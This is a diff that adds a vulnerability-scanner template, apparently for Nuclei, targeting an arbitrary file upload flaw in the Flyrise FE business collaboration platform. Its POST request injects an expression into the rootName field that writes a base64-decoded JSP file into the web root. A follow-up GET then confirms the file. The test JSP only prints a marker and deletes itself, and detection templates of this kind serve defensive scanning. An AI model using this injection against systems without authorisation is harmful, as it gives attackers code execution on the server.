@@ -1,0 +1,40 @@
+id: poc-yaml-flyrise-enterprise-common-sort-tree-anyfile-upload
+info:
+  name: 飞企互联FE业务协作平台 common_sort_tree 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_base(5)}}'
+  t2: '{{base64(t1)}}'
+  t3: '{{base64("<% out.println(\"" + t2 + "\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/common/common_sort_tree.jsp;.js'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/{{t1}}.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("{{t3}}"))%25}
+    matchers:
+      - type: status
+        status:
+          - 500
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/{{t1}}.jsp;.js'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
